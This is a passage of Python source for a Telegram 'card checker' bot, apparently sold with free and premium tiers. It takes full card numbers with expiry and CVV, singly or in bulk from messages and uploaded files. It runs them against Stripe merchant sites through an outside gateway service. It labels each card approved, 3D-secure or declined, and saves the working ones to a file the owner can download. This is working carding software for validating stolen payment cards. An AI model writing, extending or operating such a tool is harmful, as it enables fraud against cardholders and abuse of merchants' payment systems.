                formatted_cc = reg(card)
    
    # If not found in replied message, check command text
    if formatted_cc == 'None':
        parts = message.text.split(maxsplit=1)
        if len(parts) >= 2:
            card = parts[1].strip()
            formatted_cc = reg(card)
    
    # Check if we got a valid card
    if formatted_cc == 'None':
        safe_send_message(message.chat.id, "❌ No valid card found! Usage:\n\n1) .chk 4111111111111111|12|2026|123\n2) Reply .chk to a message containing card\n3) .chk visa/mastercard (CC filter)", reply_to_message_id=message.message_id)
        return
    
    # Check for CC filter
    if card and len(card.split()) == 1 and not any(char.isdigit() for char in card):
        # This might be a CC filter (visa, mastercard, etc.)
        cc_filter = card.lower()
        safe_send_message(message.chat.id, f"🔄 Generating {cc_filter.upper()} card for testing...", reply_to_message_id=message.message_id)
        
        # Generate test card based on filter
        if cc_filter == 'visa':
            card = "4111111111111111|12|2026|123"
        elif cc_filter == 'mastercard' or cc_filter == 'mc':
            card = "5555555555554444|12|2026|123"
        elif cc_filter == 'amex' or cc_filter == 'american express':
            card = "378282246310005|12|2026|1234"
        elif cc_filter == 'discover':
            card = "6011111111111117|12|2026|123"
        else:
            safe_send_message(message.chat.id, f"❌ Unknown CC type: {cc_filter}\n\nSupported: visa, mastercard, amex, discover", reply_to_message_id=message.message_id)
            return
        
        formatted_cc = reg(card)
    
    if formatted_cc == 'None':
        safe_send_message(message.chat.id, "❌ Invalid card format! Use: 4111111111111111|12|2026|123", reply_to_message_id=message.message_id)
        return
    
    # Check daily limit
    limits = get_user_limits(message.from_user.id)
    current_usage = get_user_today_usage(message.from_user.id)
    
    if limits['daily'] != float('inf') and current_usage >= limits['daily']:
        safe_send_message(
            message.chat.id,
            f"❌ Daily limit reached!\n📊 You have checked {current_usage}/{limits['daily']} cards today.",
            reply_to_message_id=message.message_id
        )
        return
    
    # Process single check - REPLY to original message
    ko_msg = safe_send_message(message.chat.id, "Checking Your Card...⌛", reply_to_message_id=message.message_id)
    if not ko_msg:
        return
    
    ko = ko_msg.message_id
    
    try:
        # Split CC details
        cc_num, mm, yy, cvc = formatted_cc.split("|")
        fullcc = f"{cc_num}|{mm}|{yy}|{cvc}"
        bin_number = cc_num[:6]
        bin_info = get_bin_info(bin_number)
        
        # Check card with retry - pass user_id for stop checking
        result = stripe_api_check(fullcc, message.from_user.id)
        status_text = result['status']
        api_status = result.get('api_status', 'declined').lower()
        response_msg = result.get('api_response', 'No response')
        is_3d = result.get('is_3d', False)
        success = result.get('success', False)
        retry_attempt = result.get('retry_attempt', 1)
        
        # Check if stopped
        if api_status == 'stopped':
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text="<b>🛑 CHECK STOPPED</b>\n\nYour card check was stopped.\n\n<b>Bot By:</b> @OG_UNDEFINED"
            )
            return
        
        # Update usage
        update_user_usage(message.from_user.id, 1)
        
        # Format result message
        if 'Approved ✅' in status_text and not is_3d and success:
            result_msg = f"""<b>[#STRIPE AUTH] | UL CHECKER ◆</b>

<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Stripe API</code>
<b>[•] Status-</b> <code>{status_text}</code>
<b>[•] Response-</b> <code>{response_msg}</code>
<b>[•] Attempts-</b> <code>{retry_attempt}</code>
______________________
<b>[+] Bin:</b> <code>{bin_info['bin']}</code>
<b>[+] Info:</b> <code>{bin_info['brand']} - {bin_info['type']}</code>
<b>[+] Bank:</b> <code>{bin_info['bank']}</code> 🏛
<b>[+] Country:</b> <code>{bin_info['country_name']}</code> ━ [{bin_info['country_flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{message.from_user.first_name}</code>
<b>[ϟ] Daily Usage:</b> {get_user_today_usage(message.from_user.id)}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}
<b>[ϟ] Bot By:</b> @OG_UNDEFINED"""
            
            # Save approved card
            with file_locks['approved']:
                with open("approved.txt", "a", encoding="utf-8") as f:
                    f.write(f"{fullcc}|{status_text}|{response_msg}\n")
                    
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=result_msg
            )
            
        elif '3D Required ⚠️' in status_text or is_3d:
            # For 3D cards, don't show detailed message
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=f"""<b>⚠️ 3D CARD DETECTED</b>

<b>Card:</b> <code>{fullcc}</code>
<b>Status:</b> {status_text}
<b>Response:</b> {response_msg}
<b>Attempts:</b> {retry_attempt}

<i>3D cards are saved to file but not shown in chat.</i>

<b>Daily Usage:</b> {get_user_today_usage(message.from_user.id)}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}"""
            )
            
            # Save 3D card to file
            with file_locks['approved']:
                with open("approved.txt", "a", encoding="utf-8") as f:
                    f.write(f"{fullcc}|3D Required|{response_msg}\n")
                    
        else:
            # For declined/error cards
            if not success:
                status_text = f"API Error ❌ (Attempts: {retry_attempt})"
            
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=f"""<b>❌ CARD DECLINED/ERROR</b>

<b>Card:</b> <code>{fullcc}</code>
<b>Status:</b> {status_text}
<b>Response:</b> {response_msg}
<b>Attempts:</b> {retry_attempt}

<b>Daily Usage:</b> {get_user_today_usage(message.from_user.id)}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}"""
            )
                        
    except Exception as e:
        safe_edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text=f"❌ Error: {str(e)}"
        )

@bot.message_handler(func=lambda message: message.text and 
                    (message.text.lower().startswith('.mass') or 
                     message.text.lower().startswith('/mass')))
def mass_command(message):
    """Mass check from text - FIXED to extract ALL cards"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    # Check active session
    user_id = message.from_user.id
    with active_checks_lock:
        if user_id in active_checks:
            safe_send_message(
                message.chat.id,
                "⚠️ You already have an active card check. Please wait for it to complete or use /stopcheck to stop it.",
                reply_to_message_id=message.message_id
            )
            return
    
    cards = []
    
    # Get cards from replied message or command text
    if message.reply_to_message and message.reply_to_message.text:
        text_content = message.reply_to_message.text
    else:
        # Check if cards are in the command itself
        parts = message.text.split('\n', 1)
        if len(parts) > 1:
            text_content = parts[1]
        else:
            safe_send_message(message.chat.id, "❌ Please reply to a message with cards or send cards after command.", reply_to_message_id=message.message_id)
            return
    
    # FIX: Extract ALL cards using regex
    lines = text_content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        # Try to extract card using regex
        patterns = [
            r'(\d{15,16})[\|\s](\d{1,2})[\|\s](\d{2,4})[\|\s](\d{3,4})',
            r'(\d{15,16})[\|\s\-:](\d{1,2})[\|\s\-:](\d{2,4})[\|\s\-:](\d{3,4})',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, line)
            for match in matches:
                if len(match) == 4:
                    cc_num, mm, yy, cvc = match
                    cards.append(f"{cc_num}|{mm}|{yy}|{cvc}")
    
    # Also try simple extraction
    if not cards:
        for line in lines:
            line = line.strip()
            if line:
                # Try to split by common separators
                parts = re.split(r'[|\s:-]+', line)
                if len(parts) >= 4:
                    # Check if first part is a card number
                    if len(parts[0]) in [15, 16] and parts[0].isdigit():
                        cards.append(f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}")
    
    if not cards:
        safe_send_message(message.chat.id, "❌ No valid cards found! Format: 4111111111111111|12|2026|123", reply_to_message_id=message.message_id)
        return
    
    # Remove duplicates while preserving order
    unique_cards = []
    seen = set()
    for card in cards:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)
    
    safe_send_message(message.chat.id, f"🔍 Found {len(unique_cards)} cards to check...", reply_to_message_id=message.message_id)
    
    # Start processing with 3-card batches
    check_queue.put((message, unique_cards, False, 'mass'))

@bot.message_handler(func=lambda message: message.text and 
                    (message.text.lower().startswith('.mtxt') or 
                     message.text.lower().startswith('/mtxt')))
def mtxt_command(message):
    """Mass check from file"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    # Check active session
    user_id = message.from_user.id
    with active_checks_lock:
        if user_id in active_checks:
            safe_send_message(
                message.chat.id,
                "⚠️ You already have an active card check. Please wait for it to complete or use /stopcheck to stop it.",
                reply_to_message_id=message.message_id
            )
            return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        safe_send_message(message.chat.id, "❌ Please reply to a .txt file with cards.", reply_to_message_id=message.message_id)
        return
    
    file_info = message.reply_to_message.document
    
    # Check file type
    if not file_info.file_name.lower().endswith('.txt'):
        safe_send_message(message.chat.id, "❌ Please upload a .txt file only.", reply_to_message_id=message.message_id)
        return
    
    # Check file size
    if file_info.file_size > 10 * 1024 * 1024:  # 10MB limit
        safe_send_message(message.chat.id, "❌ File too large! Maximum size is 10MB.", reply_to_message_id=message.message_id)
        return
    
    try:
        # Download file
        file = bot.get_file(file_info.file_id)
        downloaded = bot.download_file(file.file_path)
        
        # Save temporarily
        temp_file = f"temp_{message.chat.id}_{int(time.time())}.txt"
        with open(temp_file, 'wb') as f:
            f.write(downloaded)
        
        # Read and extract cards - FIXED to extract ALL cards
        cards = []
        with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                # Try multiple regex patterns
                patterns = [
                    r'(\d{15,16})[\|\s](\d{1,2})[\|\s](\d{2,4})[\|\s](\d{3,4})',
                    r'(\d{15,16})[\|\s\-:](\d{1,2})[\|\s\-:](\d{2,4})[\|\s\-:](\d{3,4})',
                ]
                
                card_found = False
                for pattern in patterns:
                    matches = re.findall(pattern, line)
                    for match in matches:
                        if len(match) == 4:
                            cc_num, mm, yy, cvc = match
                            cards.append(f"{cc_num}|{mm}|{yy}|{cvc}")
                            card_found = True
                
                # If no regex match, try simple splitting
                if not card_found:
                    parts = re.split(r'[|\s:-]+', line)
                    if len(parts) >= 4:
                        if len(parts[0]) in [15, 16] and parts[0].isdigit():
                            cards.append(f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}")
        
        # Clean up temp file
        os.remove(temp_file)
        
        if not cards:
            safe_send_message(message.chat.id, "❌ No valid cards found in file!", reply_to_message_id=message.message_id)
            return
        
        # Remove duplicates
        unique_cards = []
        seen = set()
        for card in cards:
            if card not in seen:
                seen.add(card)
                unique_cards.append(card)
        
        safe_send_message(message.chat.id, f"📁 Found {len(unique_cards)} cards in file...", reply_to_message_id=message.message_id)
        
        # Start processing with 3-card batches
        check_queue.put((message, unique_cards, True, 'mtxt'))
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error processing file: {str(e)}", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['stopcheck'])
def stop_check_command(message):
    """Stop current check session - ONLY for current user"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    user_id = message.from_user.id
    
    with active_checks_lock:
        if user_id not in active_checks:
            safe_send_message(message.chat.id, "❌ You don't have any active check to stop.", reply_to_message_id=message.message_id)
            return
        
        if user_id in stop_flags:
            stop_flags[user_id].set()
            time.sleep(0.5)  # Give time for threads to stop
    
    safe_send_message(message.chat.id, "🛑 Your check session has been stopped.", reply_to_message_id=message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_callback(call):
    """Handle stop button - ONLY for the user who clicked"""
    try:
        parts = call.data.split('_')
        if len(parts) < 3:
            bot.answer_callback_query(call.id, "❌ Invalid stop request!", show_alert=True)
            return
        
        target_user_id = int(parts[1])
        message_id = int(parts[2])
        
        # Check if this user is trying to stop their own check
        if call.from_user.id != target_user_id:
            bot.answer_callback_query(call.id, "❌ You can only stop your own check!", show_alert=True)
            return
        
        # Verify this user has an active check
        with active_checks_lock:
            if target_user_id not in active_checks:
                bot.answer_callback_query(call.id, "❌ You don't have an active check!", show_alert=True)
                return
            
            # Set stop flag
            if target_user_id in stop_flags:
                stop_flags[target_user_id].set()
        
        bot.answer_callback_query(call.id, "✅ Your check has been stopped!")
        
        # Update the message
        safe_edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="<b>🛑 CHECK STOPPED</b>\n\nYour card checking session has been stopped by you.\n\n<b>Bot By:</b> @OG_UNDEFINED"
        )
        
    except Exception as e:
        print(f"Error in stop_callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error stopping check!", show_alert=True)

# ==================== PREMIUM MANAGEMENT ====================

@bot.message_handler(commands=['addpremium'])
def add_premium_command(message):
    """Owner: Give premium to a user"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    user_id = None
    days = None
    
    # If replying, get user from replied message, and days from command arguments
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        parts = message.text.split()
        if len(parts) >= 2:
            try:
                days = int(parts[1])
            except ValueError:
                safe_send_message(message.chat.id, "❌ Invalid days! Must be a number.", reply_to_message_id=message.message_id)
                return
        else:
            safe_send_message(message.chat.id, "❌ Please specify number of days.\nUsage: /addpremium <days> (when replying)", reply_to_message_id=message.message_id)
            return
    else:
        # Get user ID and days from command
        parts = message.text.split()
        if len(parts) < 3:
            msg = """❌ Usage: /addpremium <user_id> <days> (or reply to user)

<b>Examples:</b>
• /addpremium 123456789 30 - Give 30 days premium
• Reply to user with /addpremium 7

<b>To get user ID:</b>
• User can use /info command"""
            safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
            return
        try:
            user_id = int(parts[1])
            days = int(parts[2])
        except ValueError:
            safe_send_message(message.chat.id, "❌ Invalid user ID or days! Must be numbers.", reply_to_message_id=message.message_id)
            return
    
    if not user_id or not days:
        safe_send_message(message.chat.id, "❌ Invalid command format! See /addpremium for usage.", reply_to_message_id=message.message_id)
        return
    
    if days <= 0:
        safe_send_message(message.chat.id, "❌ Days must be a positive number!", reply_to_message_id=message.message_id)
        return
    
    # Calculate premium expiration
    premium_until = datetime.now() + timedelta(days=days)
    user_id_str = str(user_id)
    
    with data_lock:
        if user_id_str not in users_data:
            users_data[user_id_str] = {}
        
        users_data[user_id_str]['premium_until'] = premium_until.isoformat()
    
    # Get user info
    try:
        user_info = bot.get_chat(user_id)
        user_name = user_info.first_name or "Unknown"
    except:
        user_name = "Unknown User"
    
    # Notify admin
    safe_send_message(
        message.chat.id,
        f"""✅ <b>Premium Added Successfully!</b>

<b>👤 User:</b> {user_name}
<b>🆔 User ID:</b> <code>{user_id}</code>
<b>💎 Status:</b> PREMIUM
<b>⏳ Duration:</b> {days} days
<b>📅 Valid Until:</b> {premium_until.strftime('%Y-%m-%d %H:%M:%S')}

<b>The user now has premium access!</b>""",
        reply_to_message_id=message.message_id
    )
    
    # Try to notify the user
    try:
        bot.send_message(
            user_id,
            f"""🎉 <b>CONGRATULATIONS!</b>

You have been granted <b>PREMIUM ACCESS</b> to UL Stripe Checker!

<b>💎 Your New Status:</b> PREMIUM USER
<b>⏳ Duration:</b> {days} days
<b>📅 Valid Until:</b> {premium_until.strftime('%Y-%m-%d %H:%M:%S')}

<b>🔥 Premium Benefits:</b>
• Unlimited card checking
• Higher limits for mass checks
• Reduced cooldown
• Access in private chat

<b>🎯 Your New Limits:</b>
• Single Check: Unlimited
• Mass Check: {user_limits['premium']['mass'] if user_limits['premium']['mass'] != float('inf') else '∞'} cards
• File Check: {user_limits['premium']['mtxt'] if user_limits['premium']['mtxt'] != float('inf') else '∞'} cards
• Cooldown: {user_limits['premium']['cooldown']} seconds

<b>⚡ Start checking with:</b>
• .chk [card] - In private or group
• .mass - For mass checks
• .mtxt - For file checks

<b>Thank you for using UL Checker! 🤖</b>""",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Could not notify user: {e}")

@bot.message_handler(commands=['removepremium'])
def remove_premium_command(message):
    """Owner: Remove premium from a user"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    user_id = None
    
    # If replying, get user from replied message
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
    else:
        parts = message.text.split()
        if len(parts) < 2:
            msg = """❌ Usage: /removepremium <user_id> (or reply to user)

<b>Examples:</b>
• /removepremium 123456789
• Reply to user's message with /removepremium

<b>To get user ID:</b>
• User can use /info command"""
            safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
            return
        try:
            user_id = int(parts[1])
        except ValueError:
            safe_send_message(message.chat.id, "❌ Invalid user ID! Must be a number.", reply_to_message_id=message.message_id)
            return
    
    if not user_id:
        safe_send_message(message.chat.id, "❌ Invalid command format! See /removepremium for usage.", reply_to_message_id=message.message_id)
        return
    
    user_id_str = str(user_id)
    
    with data_lock:
        if user_id_str not in users_data or 'premium_until' not in users_data[user_id_str]:
            safe_send_message(message.chat.id, f"❌ User <code>{user_id}</code> doesn't have premium access!", reply_to_message_id=message.message_id)
            return
        
        # Remove premium
        del users_data[user_id_str]['premium_until']
        
        # If user data is empty, remove it
        if not users_data[user_id_str]:
            del users_data[user_id_str]
    
    # Get user info
    try:
        user_info = bot.get_chat(user_id)
        user_name = user_info.first_name or "Unknown"
    except:
        user_name = "Unknown User"
    
    # Notify admin
    safe_send_message(
        message.chat.id,
        f"""✅ <b>Premium Removed Successfully!</b>

<b>👤 User:</b> {user_name}
<b>🆔 User ID:</b> <code>{user_id}</code>
<b>📊 New Status:</b> FREE USER

<b>The user's premium access has been removed.</b>""",
        reply_to_message_id=message.message_id
    )
    
    # Try to notify the user
    try:
        bot.send_message(
            user_id,
            f"""ℹ️ <b>NOTICE</b>

Your <b>PREMIUM ACCESS</b> to UL Stripe Checker has been removed.

<b>📊 Your New Status:</b> FREE USER
<b>⚠️ Your Access:</b> Group Only

<b>🎯 Your New Limits:</b>
• Single Check: 1 card
• Mass Check: {user_limits['free']['mass']} cards
• File Check: {user_limits['free']['mtxt']} cards
• Cooldown: {user_limits['free']['cooldown']} seconds

<b>You can still use the bot in authorized groups.</b>
<b>Contact owner for premium inquiries.</b>

<b>Thank you for using UL Checker! 🤖</b>""",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Could not notify user: {e}")

@bot.message_handler(commands=['premiuminfo'])
def premium_info_command(message):
    """Owner: Check user's premium status"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    user_id = None
    
    # If replying, get user from replied message
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
    else:
        parts = message.text.split()
        if len(parts) < 2:
            msg = """❌ Usage: /premiuminfo <user_id> (or reply to user)

<b>Examples:</b>
• /premiuminfo 123456789
• Reply to user's message with /premiuminfo

<b>To get user ID:</b>
• User can use /info command"""
            safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
            return
        try:
            user_id = int(parts[1])
        except ValueError:
            safe_send_message(message.chat.id, "❌ Invalid user ID! Must be a number.", reply_to_message_id=message.message_id)
            return
    
    if not user_id:
        safe_send_message(message.chat.id, "❌ Invalid command format! See /premiuminfo for usage.", reply_to_message_id=message.message_id)
        return
    
    user_id_str = str(user_id)
    user_status = get_user_status(user_id)
    
    # Get user info
    try:
        user_info = bot.get_chat(user_id)
        user_name = user_info.first_name or "Unknown"
        username = f"@{user_info.username}" if user_info.username else "No username"
    except:
        user_name = "Unknown User"
        username = "Unknown"
    
    with data_lock:
        user_data = users_data.get(user_id_str, {})
    
    if user_status == 'premium':
        premium_until = datetime.fromisoformat(user_data.get('premium_until', ''))
        days_left = (premium_until - datetime.now()).days
        hours_left = (premium_until - datetime.now()).seconds // 3600
        
        msg = f"""<b>💎 PREMIUM USER INFORMATION</b>

<b>👤 User:</b> {user_name}
<b>📱 Username:</b> {username}
<b>🆔 User ID:</b> <code>{user_id}</code>
<b>💎 Status:</b> PREMIUM
<b>📅 Premium Until:</b> {premium_until.strftime('%Y-%m-%d %H:%M:%S')}
<b>⏳ Time Left:</b> {days_left} days, {hours_left} hours

<b>🎯 Current Limits:</b>
• Single Check: {user_limits['premium']['single'] if user_limits['premium']['single'] != float('inf') else '∞'} card
• Mass Check: {user_limits['premium']['mass'] if user_limits['premium']['mass'] != float('inf') else '∞'} cards
• File Check: {user_limits['premium']['mtxt'] if user_limits['premium']['mtxt'] != float('inf') else '∞'} cards
• Cooldown: {user_limits['premium']['cooldown']} seconds
• Daily Limit: {user_limits['premium']['daily'] if user_limits['premium']['daily'] != float('inf') else '∞'} cards"""
    else:
        msg = f"""<b>⚡ FREE USER INFORMATION</b>

<b>👤 User:</b> {user_name}
<b>📱 Username:</b> {username}
<b>🆔 User ID:</b> <code>{user_id}</code>
<b>📊 Status:</b> FREE

<b>🎯 Current Limits:</b>
• Single Check: {user_limits['free']['single']} card
• Mass Check: {user_limits['free']['mass']} cards
• File Check: {user_limits['free']['mtxt']} cards
• Cooldown: {user_limits['free']['cooldown']} seconds
• Daily Limit: {user_limits['free']['daily'] if user_limits['free']['daily'] != float('inf') else '∞'} cards

<b>📝 Notes:</b>
• Free users can only use bot in groups
• Contact owner for premium access"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['premiumusers'])
def premium_users_command(message):
    """Owner: List all premium users"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    with data_lock:
        premium_users = []
        expired_users = []
        
        for user_id_str, user_data in users_data.items():
            if 'premium_until' in user_data:
                try:
                    premium_until = datetime.fromisoformat(user_data['premium_until'])
                    user_id = int(user_id_str)
                    
                    # Get user info
                    try:
                        user_info = bot.get_chat(user_id)
                        user_name = user_info.first_name or "Unknown"
                        username = f"@{user_info.username}" if user_info.username else "No username"
                    except:
                        user_name = "Unknown"
                        username = "Unknown"
                    
                    if datetime.now() < premium_until:
                        days_left = (premium_until - datetime.now()).days
                        premium_users.append({
                            'id': user_id,
                            'name': user_name,
                            'username': username,
                            'until': premium_until,
                            'days_left': days_left
                        })
                    else:
                        expired_users.append({
                            'id': user_id,
                            'name': user_name,
                            'username': username,
                            'until': premium_until
                        })
                except:
                    continue
    
    if not premium_users and not expired_users:
        safe_send_message(message.chat.id, "❌ No premium users found!", reply_to_message_id=message.message_id)
        return
    
    # Sort by expiration date (soonest first)
    premium_users.sort(key=lambda x: x['until'])
    
    # Create message
    msg = "<b>💎 PREMIUM USERS LIST</b>\n\n"
    
    if premium_users:
        msg += f"<b>✅ Active Premium Users ({len(premium_users)}):</b>\n"
        for i, user in enumerate(premium_users, 1):
            msg += f"{i}. {user['name']} ({user['username']})\n"
            msg += f"   ID: <code>{user['id']}</code>\n"
            msg += f"   Expires: {user['until'].strftime('%Y-%m-%d')} ({user['days_left']} days left)\n\n"
    else:
        msg += "<b>❌ No active premium users</b>\n\n"
    
    if expired_users:
        msg += f"<b>⚠️ Expired Premium Users ({len(expired_users)}):</b>\n"
        for i, user in enumerate(expired_users[:5], 1):  # Show only first 5 expired
            msg += f"{i}. {user['name']} ({user['username']})\n"
            msg += f"   ID: <code>{user['id']}</code>\n"
            msg += f"   Expired: {user['until'].strftime('%Y-%m-%d')}\n\n"
        if len(expired_users) > 5:
            msg += f"... and {len(expired_users) - 5} more expired users\n\n"
    
    msg += "<b>📊 Commands:</b>\n"
    msg += "• /addpremium <id> <days> - Give premium\n"
    msg += "• /removepremium <id> - Remove premium\n"
    msg += "• /premiuminfo <id> - Check user status\n"
    msg += "• /premiumusers - List all premium users"
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

# ==================== ADMIN COMMANDS ====================

@bot.message_handler(commands=['addsite'])
def add_site_command(message):
    """Owner: Add stripe site"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /addsite <site_domain>\n\nExample: /addsite example.com", reply_to_message_id=message.message_id)
        return
    
    site = parts[1].strip().lower()
    # Remove http:// or https:// if present
    site = site.replace('http://', '').replace('https://', '')
    
    with sites_lock:
        if site in stripe_sites:
            safe_send_message(message.chat.id, f"⚠️ Site <code>{site}</code> is already in the list!", reply_to_message_id=message.message_id)
            return
        
        stripe_sites.append(site)
    
    safe_send_message(
        message.chat.id,
        f"""✅ <b>Site Added Successfully!</b>

<b>Site:</b> <code>{site}</code>
<b>Total Sites:</b> {len(stripe_sites)}

<b>Current Sites:</b>
{', '.join([f'<code>{s}</code>' for s in stripe_sites])}""",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=['removesite'])
def remove_site_command(message):
    """Owner: Remove stripe site"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /removesite <site_domain>\n\nExample: /removesite example.com", reply_to_message_id=message.message_id)
        return
    
    site = parts[1].strip().lower()
    
    with sites_lock:
        if site not in stripe_sites:
            safe_send_message(message.chat.id, f"❌ Site <code>{site}</code> not found in the list!", reply_to_message_id=message.message_id)
            return
        
        stripe_sites.remove(site)
    
    safe_send_message(
        message.chat.id,
        f"""✅ <b>Site Removed Successfully!</b>

<b>Site:</b> <code>{site}</code>
<b>Total Sites:</b> {len(stripe_sites)}

<b>Remaining Sites:</b>
{', '.join([f'<code>{s}</code>' for s in stripe_sites]) if stripe_sites else 'No sites'}""",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=['sites'])
def list_sites_command(message):
    """List all stripe sites"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    with sites_lock:
        sites_count = len(stripe_sites)
        
        if not stripe_sites:
            safe_send_message(message.chat.id, "❌ No sites configured! Add sites first.", reply_to_message_id=message.message_id)
            return
        
        sites_list = "\n".join([f"{i+1}. <code>{site}</code>" for i, site in enumerate(stripe_sites)])
    
    msg = f"""<b>🌐 STRIPE SITES LIST</b>

<b>Total Sites:</b> {sites_count}

<b>Sites:</b>
{sites_list}

<b>Owner Commands:</b>
• /addsite <site> - Add new site
• /removesite <site> - Remove site
• /testsite <site> - Test if site is working"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['testsite'])
def test_site_command(message):
    """Test if a site is working"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /testsite <site_domain>\n\nExample: /testsite example.com", reply_to_message_id=message.message_id)
        return
    
    site = parts[1].strip().lower()
    
    # Test the site
    test_msg = safe_send_message(message.chat.id, f"Testing site <code>{site}</code>...", reply_to_message_id=message.message_id)
    
    try:
        # Create a test URL
        test_url = f"https://wiardsclub.onrender.com/gateway=autostripe/key=wizard/site={site}/cc=4111111111111111|12|2026|123"
        response = requests.get(test_url, timeout=300)
        
        if response.status_code == 200:
            result = "✅ Site is working"
        else:
            result = f"❌ Site returned HTTP {response.status_code}"
        
        safe_edit_message_text(
            chat_id=message.chat.id,
            message_id=test_msg.message_id,
            text=f"""<b>🌐 SITE TEST RESULT</b>

<b>Site:</b> <code>{site}</code>
<b>Status:</b> {result}
<b>Response Code:</b> {response.status_code}

<b>Response Preview:</b>
<code>{response.text[:100] if response.text else 'No response'}</code>"""
        )
        
    except Exception as e:
        safe_edit_message_text(
            chat_id=message.chat.id,
            message_id=test_msg.message_id,
            text=f"""<b>🌐 SITE TEST RESULT</b>

<b>Site:</b> <code>{site}</code>
<b>Status:</b> ❌ Error
<b>Error:</b> {str(e)}"""
        )

@bot.message_handler(commands=['getapproved'])
def get_approved_command(message):
    """Owner: Get all approved cards file"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    # Check if approved file exists
    if not os.path.exists("approved.txt"):
        safe_send_message(message.chat.id, "❌ No approved cards file found yet.", reply_to_message_id=message.message_id)
        return
    
    try:
        # Count lines in file
        with open("approved.txt", "r", encoding="utf-8") as f:
            lines = f.readlines()
            total_cards = len(lines)
        
        if total_cards == 0:
            safe_send_message(message.chat.id, "❌ Approved cards file is empty.", reply_to_message_id=message.message_id)
            return
        
        # Send the file
        with open("approved.txt", "rb") as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"✅ Approved Cards File\n📊 Total Cards: {total_cards}\n📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="HTML"
            )
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error getting approved file: {str(e)}", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['clearapproved'])
def clear_approved_command(message):
    """Owner: Clear approved cards file"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    try:
        if os.path.exists("approved.txt"):
            # Backup before clearing
            backup_name = f"approved_backup_{int(time.time())}.txt"
            os.rename("approved.txt", backup_name)
            
            safe_send_message(
                message.chat.id,
                f"""✅ <b>Approved Cards Cleared!</b>

<b>Backup File:</b> {backup_name}
<b>New file will be created automatically.</b>""",
                reply_to_message_id=message.message_id
            )
        else:
            safe_send_message(message.chat.id, "❌ No approved cards file to clear.", reply_to_message_id=message.message_id)
            
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error clearing approved file: {str(e)}", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['stats'])
def stats_command(message):
